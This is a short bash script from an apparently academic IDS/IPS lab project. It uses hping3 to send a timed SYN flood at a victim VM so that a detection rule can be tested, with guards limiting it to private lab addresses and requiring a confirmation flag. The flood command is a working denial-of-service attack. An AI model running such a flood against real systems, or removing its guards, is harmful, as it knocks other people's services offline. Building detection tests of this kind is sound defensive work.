#!/usr/bin/env bash
#
# syn_flood.sh - Aegis IDS/IPS, Module 1 (Bishika Pokharel)
#
# Generates SYN-flood traffic from the Attacker VM against the Victim VM so
# the detection engine's signature rule (FR-11, FR-14) has real traffic to
# test against. FOR USE INSIDE THE ISOLATED HOST-ONLY LAB ONLY (NFR-3).
#
# Usage:
#   ./syn_flood.sh <victim_ip> [port] [duration_seconds] --confirm-lab
#
# Example:
#   ./syn_flood.sh 192.168.56.11 80 20 --confirm-lab
#
# Requires: hping3, and that you run this ON the Attacker VM.

set -euo pipefail

usage() {
  echo "Usage: $0 <victim_ip> [port=80] [duration_sec=20] --confirm-lab"
  echo "  --confirm-lab is required and only works against a private lab IP."
  exit 1
}

TARGET="${1:-}"
PORT="${2:-80}"
DURATION="${3:-20}"
CONFIRM="${4:-}"

[ -z "$TARGET" ] && usage
[ "$CONFIRM" != "--confirm-lab" ] && { echo "Refusing to run: pass --confirm-lab as the 4th argument."; usage; }

# Safety guard: only allow RFC1918 private addresses (your host-only lab subnet).
if ! [[ "$TARGET" =~ ^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.) ]]; then
  echo "ERROR: $TARGET is not a private/lab address. This script will not target it."
  echo "Point it at your Victim VM's host-only IP (e.g. 192.168.56.x)."
  exit 1
fi

if ! command -v hping3 >/dev/null; then
  echo "hping3 not found. Install it first: sudo apt install hping3"
  exit 1
fi

echo "=== SYN flood: target=$TARGET port=$PORT duration=${DURATION}s ==="
echo "Running inside the isolated host-only lab only. Stops automatically."
echo "Start time: $(date)"

# `timeout` guarantees the flood cannot run forever even if something hangs.
timeout "${DURATION}s" hping3 -S --flood -V -p "$PORT" "$TARGET" || true

echo "Stopped at: $(date)"
echo "Check eve.json / the detection engine for a SYN-flood alert (TC-17)."
